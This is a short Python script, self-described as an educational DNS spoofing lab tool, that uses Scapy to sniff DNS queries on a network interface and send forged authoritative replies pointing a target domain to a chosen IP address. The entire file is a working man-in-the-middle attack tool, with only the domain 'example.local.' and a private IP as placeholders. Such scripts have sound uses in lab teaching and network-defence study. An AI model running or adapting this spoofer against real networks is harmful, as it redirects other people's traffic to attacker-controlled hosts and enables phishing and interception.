#!/usr/bin/env python3

from scapy.all import *
import argparse

def spoof_dns(packet):
    # Check if the packet has DNS query and a UDP layer
    if packet.haslayer(DNSQR) and packet.haslayer(UDP):
        try:
            qname = packet[DNSQR].qname.decode('utf-8')
        except Exception:
            return

        # Define the target lab domain
        target_domain = "example.local."

        if target_domain in qname:
            print(f"[+] Detected DNS query for {qname} from {packet[IP].src}")
            
            # Define lab server IP address
            spoof_ip = "192.168.1.100"

            # Construct the response packet
            ip_layer = IP(dst=packet[IP].src, src=packet[IP].dst)
            udp_layer = UDP(dport=packet[UDP].sport, sport=53)

            dns_layer = DNS(
                id=packet[DNS].id,
                qr=1,
                aa=1,
                rd=packet[DNS].rd,
                qd=packet[DNS].qd,
                an=DNSRR(rrname=qname, type="A", rclass="IN", ttl=10, rdata=spoof_ip)
            )
            
            # Send the forged packet back onto the network iface
            forged_packet = ip_layer / udp_layer / dns_layer
            send(forged_packet, verbose=0)
            print(f"[+] Sent forged DNS response to {packet[IP].src}: {qname} -> {spoof_ip}")

def main():
    parser = argparse.ArgumentParser(description="Educational DNS Spoofing Lab Script using Scapy")
    parser.add_argument("--interface", required=True, help="Network interface to sniff on (e.g. eth0 or wlan0)")
    args = parser.parse_args()

    print(f"[*] Starting DNS spoofer on interface {args.interface}...")
    print(f"[*] Press Ctrl+C to stop.")

    sniff(filter="udp port 53", prn=spoof_dns, store=0, iface=args.interface)

if __name__ == "__main__":
    main()


